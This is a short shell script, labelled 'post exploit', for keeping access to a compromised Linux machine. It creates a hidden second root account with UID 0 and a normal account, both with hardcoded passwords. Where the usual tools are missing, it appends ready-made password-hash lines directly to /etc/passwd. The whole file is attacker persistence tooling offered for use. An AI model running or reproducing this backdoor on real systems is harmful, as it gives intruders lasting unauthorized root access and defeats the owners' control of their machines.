#!/bin/sh

#
# post exploit.
# create a root user and a normal user
#
# should run this script by `root` user
#
# it will exec `useradd` and `chpasswd` normally, and you can change the
# username and password.
#
# however, it would edit `/etc/passwd` and `/etc/shadow` file directly to add
# user when `useradd` and `chpasswd` is not *executable*.
#
# default username / password :
#                                ffake / p@ssw3rd135246
#                                ffakenormal / p@ssw3rd135246


if test $(which useradd) && test $(which chpasswd); then
    # add user with `useradd` and `chpasswd` normally
    # change this
    name="ffake"
    pass="p@ssw3rd135246"
    normalUser="ffakenormal"

    # add a normal user
    useradd $normalUser
    if [ $? -eq 0 ];then
       echo "user ${normalUser} has been created."
    else
       echo "create user ${normalUser} failure."
       exit 1
    fi

    # add a root user
    useradd -o -u 0 -g 0 $name
    if [ $? -eq 0 ];then
       echo "user ${name} has been created."
    else
       echo "create user ${name} failure."
       exit 1
    fi

    # set password
    #
    # just work in bash
    #echo -e "$pass\n$pass" | passwd "$name" &>/dev/null
    #
    # work in bash and sh
    echo "${name}:${pass}" | chpasswd &>/dev/null
    if [ $? -eq 0 ];then
       echo "${name}'s password has been changed."
    else
       echo "change ${name}'s password failure."
       exit 1
    fi

    echo "${normalUser}:${pass}" | chpasswd &>/dev/null
    if [ $? -eq 0 ];then
       echo "${normalUser}'s password has been changed."
    else
       echo "change ${normalUser}'s password failure."
       exit 1
    fi
else
    # add user manual {ffake,ffakenormal} / p@ssw3rd135246
    #
    # /etc/passwd
    echo 'ffakenormal:Vy1nEX1Sss0XY:1002:1003::/home/ffakenormal:/bin/sh' >> /etc/passwd
    echo 'ffake:Vy1nEX1Sss0XY:0:0::/root/:/bin/sh' >>/etc/passwd
    exit 0
fi

